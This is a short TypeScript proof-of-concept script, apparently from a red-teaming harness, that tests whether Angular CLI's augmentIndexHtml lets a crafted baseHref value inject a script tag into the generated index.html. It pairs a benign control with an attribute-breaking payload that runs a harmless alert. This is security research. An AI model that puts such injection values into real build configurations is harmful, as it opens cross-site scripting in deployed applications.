// Next-phase D-R2 member-F demo: augmentIndexHtml baseHref raw HTML injection
import { augmentIndexHtml } from '/Users/matheusvsky/Documents/trab/llm-redteam-harness/upstream/angular-cli/packages/angular/build/src/utils/index-file/augment-index-html';
import { writeFileSync } from 'node:fs';

async function run(baseHref: string | undefined, label: string) {
  const html = '<!doctype html><html><head><meta charset="utf-8"><title>app</title></head><body><app-root></app-root></body></html>';
  const { content, warnings, errors } = await augmentIndexHtml({
    html,
    baseHref,
    files: [],
    entrypoints: [],
    loadOutputFile: async () => '',
    deployUrl: undefined,
    sri: false,
    crossOrigin: undefined,
  } as any);
  writeFileSync(`/tmp/nr2-mf/index-${label}.html`, content);
  console.log(`[${label}] injected script tag present:`, /<script[\s>]/.test(content));
  console.log(`[${label}] emitted head snippet:`, content.slice(content.indexOf('<head>'), content.indexOf('</head>') + 7));
  console.log(`[${label}] errors:`, JSON.stringify(errors));
}

// NEGATIVE CONTROL: benign baseHref
await run('/my-app/', 'neg');
// POSITIVE: malicious baseHref -> script injection into <head>
await run('"><script>alert("MF-INJECTED")</script><base href="x', 'pos');
